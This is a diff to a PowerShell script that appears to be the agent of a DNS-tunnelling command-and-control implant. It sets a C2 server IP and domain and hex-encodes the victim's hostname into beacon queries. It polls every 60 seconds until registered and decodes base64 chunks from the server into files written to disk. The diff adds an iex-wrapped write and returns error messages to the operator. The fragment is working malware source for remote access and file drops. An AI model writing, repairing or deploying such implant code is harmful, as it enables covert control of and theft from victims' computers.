@@ -1,4 +1,4 @@
-#$server = '52.54.122.146'
+﻿
 $server = '192.168.1.113'
 $name = 'koratxt.net'
 $hostname = Get-Content env:computername
@@ -95,16 +95,23 @@ function savefile(){
         $index += $b64.Length
         $file += [Convert]::FromBase64String($b64)
     }
-    [io.file]::WriteAllBytes($filename, $file)
-
-    serverget("$(StringToHex('done')).$id.$encCmd")
+    try{
+        [Environment]::CurrentDirectory = $PWD
+        iex '[io.file]::WriteAllBytes($filename, $file)'
+        serverget("$(StringToHex('done')).$id.$encCmd")
+    }
+    catch {
+        $lasterror = $Error[0].Exception.Message
+        send_response("$lasterror")
+    }
+    
 }
 
 #initialize
 $id = serverget("$(StringtoHex($hostname)).0.$(StringToHex('int'))")
 while (!$id){
     sleep -Seconds 60
-    $id = serverget("$encHostname.0.$encCmd")
+    $id = serverget("$(StringtoHex($hostname)).0.$(StringToHex('int'))")
 }
 
 while ($true) {
